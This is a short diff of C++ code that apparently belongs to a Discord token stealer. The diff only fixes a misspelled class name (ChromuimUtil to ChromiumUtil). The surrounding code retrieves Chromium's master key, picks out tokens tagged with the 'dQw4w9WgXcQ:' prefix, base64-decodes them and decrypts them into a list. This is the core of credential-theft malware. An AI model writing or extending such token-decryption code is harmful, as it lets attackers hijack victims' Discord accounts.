@@ -78,7 +78,7 @@ std::vector<std::string> Discord::getToken(fs::path &root) {
     if(!exists(root))
         return {};
 
-    std::vector<BYTE> masterKey = ChromuimUtil::getMasterKey(root);
+    std::vector<BYTE> masterKey = ChromiumUtil::getMasterKey(root);
     if(masterKey.empty())
         return {};
 
@@ -120,7 +120,7 @@ std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BY
                     unformatted_token = unformatted_token.substr(unformatted_token.find("dQw4w9WgXcQ:") + 12);
                     std::vector<BYTE> decoded_token(Base64Util::b64decode(unformatted_token));
 
-                    std::string decryptedToken = ChromuimUtil::decryptData(decoded_token, master_key);
+                    std::string decryptedToken = ChromiumUtil::decryptData(decoded_token, master_key);
                     tokens.push_back(decryptedToken);
 
                     line = match.suffix().str();
